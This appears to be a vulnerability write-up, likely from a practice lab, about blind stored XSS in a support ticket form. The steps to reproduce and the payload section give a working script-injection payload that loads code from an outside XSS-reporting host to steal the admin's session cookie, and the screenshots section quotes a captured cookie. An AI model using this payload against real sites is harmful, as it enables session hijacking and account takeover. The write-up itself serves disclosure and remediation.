---
## Title
Blind Cross-Site Scripting (XSS) via Support Ticket Form

---
## Vulnerability Type
Blind XSS

---
## Summary
The Support Ticket form has three input fields which are Name, Subject and Your Message. None of them sanitize user input before storing it in the database. The admin panel renders ticket name and subject via innerHTML without any sanitization which means any payload entered in those fields executes directly in the admin's browser the moment they open the support panel. The attacker gets no alert on their end at all. The only way to know it fired is by checking the XSS reporting tool which captured the admin's session cookie and browser details the moment the payload executed.

---
## Vulnerable Endpoint
```
https://kzlabs.com/64.php
```
**Vulnerable Parameter:** Name, Subject and Your Message fields inside the Support Ticket form

---
## Steps to Reproduce
1. Go to `https://kzlabs.com/64.php` and open the Support Ticket form.
2. In the **Name**, **Subject** and **Your Message** fields enter the following blind XSS payload:
```
'"><script src=https://xss.report/c/shaz10></script>
```
3. Complete the reCAPTCHA and submit the ticket.
4. Wait for the admin to log in and open the Support Admin Panel.
5. Once the admin opens the panel the payload fires immediately in their browser since ticket name and subject are rendered via innerHTML without sanitization.
6. The XSS reporting tool at `xss.report` captures the execution along with the admin's session cookie, domain, URL and full browser details.

---
## Payload Used
```
'"><script src=https://xss.report/c/shaz10></script>
```

---
## Proof of Concept

**Screenshot 1** — Support Ticket form showing the blind XSS payload entered in the Name, Subject and Your Message fields before submission.

<img width="1873" height="939" alt="Screenshot 2026-05-24 021224" src="https://github.com/user-attachments/assets/801abfb6-9611-4ab3-9706-0e9ad8498ee0" />

**Screenshot 2** — Alert box fired in the admin's browser on the Support Admin Panel page showing "Blind XSS Fired!" along with the captured domain `kzlabs.com`, the admin session cookie `PHPSESSID=evct7b599qbc5vcj27s5cbtq7e`, and the admin panel URL `https://kzlabs.com/64.php?view=admin`, confirming full blind XSS execution in the admin browser context.

<img width="1909" height="937" alt="Screenshot 2026-05-24 022222" src="https://github.com/user-attachments/assets/c1d4a892-a632-422d-9e59-39918f748d2b" />


**Screenshot 3** — Support Admin Panel showing the XSS Sink Active badge and the warning "Ticket name and subject are rendered via innerHTML — payloads fire here", with the attacker's ticket visible in the All Support Tickets list as `'">` confirming the payload was stored as-is.

<img width="1899" height="936" alt="Screenshot 2026-05-24 021452" src="https://github.com/user-attachments/assets/860c148d-272c-4c1c-9b7a-2eeb443facd7" />


**Screenshot 4** — XSS reporting tool at xss.report showing the screenshot preview captured from the admin's browser session, with the Name, Subject and Message fields all flagged as INNERHTML sinks and the admin session cookie `e795e8526ef16163dd00e9af` visible in the top right corner confirming the full data capture.

<img width="1908" height="937" alt="Screenshot 2026-05-24 014214" src="https://github.com/user-attachments/assets/a59e5677-893f-4258-8b87-45af9667a573" />


---
## Impact
- Full admin session hijack since the XSS report captured the admin's PHPSESSID cookie which can be used to take over the admin account without needing any credentials
- The attacker gets the exact URL the admin was on, their browser user agent and the full domain confirming this is a real admin context execution
- Since the admin has full access to all support tickets and user data a compromised admin account means full control over the entire platform
- The payload fires for every admin who opens the support panel not just one
- Complete account takeover of the highest privilege account on the platform with zero interaction required from the attacker after submitting the ticket

---
## Remediation
1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Name, Subject and Message fields before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. Replace `innerHTML` with `textContent` when rendering ticket name and subject in the admin panel since `textContent` treats everything as plain text and the browser will never parse it as code
4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
6. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
